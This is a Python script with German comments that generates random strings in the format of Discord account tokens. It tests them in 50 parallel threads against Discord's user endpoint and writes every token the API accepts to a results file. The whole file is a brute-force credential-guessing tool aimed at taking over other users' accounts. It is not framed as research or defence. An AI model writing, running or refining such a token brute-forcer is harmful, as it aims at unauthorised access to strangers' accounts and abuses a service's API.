import string
import random
import requests
import threading
import time

# Konfigurationsparameter
NUM_TOKENS = 1000  # Anzahl der zu generierenden Tokens
NUM_THREADS = 50   # Anzahl der Threads zur gleichzeitigen Überprüfung
DISCORD_API_URL = 'https://discord.com/api/v8/users/@me'

# Token-Generierung
def generate_token():
    first = ''.join(random.choices(string.ascii_letters + string.digits + '-_', k=24))
    second = ''.join(random.choices(string.ascii_letters + string.digits + '-_', k=6))
    third = ''.join(random.choices(string.ascii_letters + string.digits + '-_', k=38))
    return f"{first}.{second}.{third}"

# Token-Überprüfung
def check_token(token):
    headers = {'Authorization': token}
    try:
        response = requests.get(DISCORD_API_URL, headers=headers)
        if response.status_code == 200:
            return token, "Valid"
        elif response.status_code == 401:
            return token, "Invalid"  # Unauthorized - token invalid
        else:
            return token, f"Error: {response.status_code}"
    except requests.RequestException as e:
        return token, f"Exception: {str(e)}"

# Funktion zur Verarbeitung von Tokens
def process_tokens():
    start_time = time.time()
    tokens = [generate_token() for _ in range(NUM_TOKENS)]
    
    results = []

    # Funktion für die Verarbeitung eines Tokens durch einen Thread
    def worker():
        while tokens:
            token = tokens.pop()
            token, status = check_token(token)
            results.append(f"Token: {token} | Status: {status}")
            print(f"Token: {token} | Status: {status}")

    # Threads starten
    threads = []
    for _ in range(NUM_THREADS):
        t = threading.Thread(target=worker)
        t.start()
        threads.append(t)

    # Warten, bis alle Threads beendet sind
    for t in threads:
        t.join()

    # Gesamte Verarbeitungszeit
    print(f"Processing Time: {time.time() - start_time:.2f} seconds")

    # Ergebnisse in Datei speichern
    with open('token_results.txt', 'w') as file:
        file.write('\n'.join(results))

if __name__ == "__main__":
    process_tokens()
